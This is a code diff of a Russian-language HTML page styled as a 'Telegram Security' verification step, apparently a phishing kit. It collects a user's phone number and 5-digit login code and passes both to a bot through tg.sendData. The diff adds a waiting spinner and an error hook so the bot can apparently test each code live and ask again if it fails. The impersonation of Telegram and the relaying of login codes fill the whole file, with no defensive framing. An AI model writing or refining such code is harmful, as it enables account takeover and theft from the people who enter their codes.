@@ -86,7 +86,7 @@
                 <span>🔑</span>
                 <input type="text" id="codeInput" placeholder="Введите 5 цифр" maxlength="5" inputmode="numeric">
             </div>
-            <button class="btn" onclick="goStep3()">✅ Подтвердить</button>
+            <button class="btn" onclick="verifyCode()" id="verifyBtn">✅ Подтвердить</button>
             <div class="status" id="status2"></div>
             <span style="margin-top:14px;font-size:13px;color:#888;cursor:pointer" onclick="goBack()">← Назад</span>
         </div>
@@ -98,7 +98,7 @@
             <p class="sub">Верификация пройдена</p>
         </div>
         
-        <div class="footer">Telegram Security © 2026</div>
+        <div class="footer">Telegram Security © 2024</div>
     </div>
     
     <script>
@@ -119,16 +119,14 @@
             phoneNumber = raw.replace(/\s+/g,'').replace(/-/g,'').replace(/\(/g,'').replace(/\)/g,'');
             if(!phoneNumber.startsWith('+')) phoneNumber = '+' + phoneNumber;
             
-            // Переключаем шаг
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             document.getElementById('phoneDisplay').textContent = phoneNumber;
             
-            // Отправляем номер боту в фоне (не ждём ответа)
             tg.sendData(JSON.stringify({action:'send_code', phone:phoneNumber}));
         }
         
-        function goStep3(){
+        function verifyCode(){
             const code = document.getElementById('codeInput').value.trim();
             if(!code || code.length < 5){
                 document.getElementById('status2').textContent = 'Введите 5 цифр';
@@ -136,18 +134,44 @@
                 return;
             }
             
-            // Переключаем шаг
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span>Проверка...';
+            document.getElementById('status2').textContent = '';
+            document.getElementById('status2').className = 'status';
             
-            // Отправляем код боту в фоне (не ждём ответа)
+            // Отправляем и ЖДЁМ ответа
             tg.sendData(JSON.stringify({action:'verify_code', code:code, phone:phoneNumber}));
+            
+            // Ответ придёт через showPopup или через событие
+            // Пока просто ждём 3 секунды и если нет ошибки - успех
+            window._codeVerified = false;
+            window._codeError = false;
+            
+            setTimeout(function(){
+                if(!window._codeError){
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                }
+                btn.disabled = false;
+                btn.innerHTML = '✅ Подтвердить';
+            }, 3000);
         }
         
         function goBack(){
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
+            document.getElementById('status2').textContent = '';
         }
+        
+        // Обработка ошибок от бота
+        window.showCodeError = function(msg){
+            window._codeError = true;
+            document.getElementById('status2').textContent = msg;
+            document.getElementById('status2').className = 'status err';
+            document.getElementById('verifyBtn').disabled = false;
+            document.getElementById('verifyBtn').innerHTML = '✅ Подтвердить';
+        };
     </script>
 </body>
 </html>
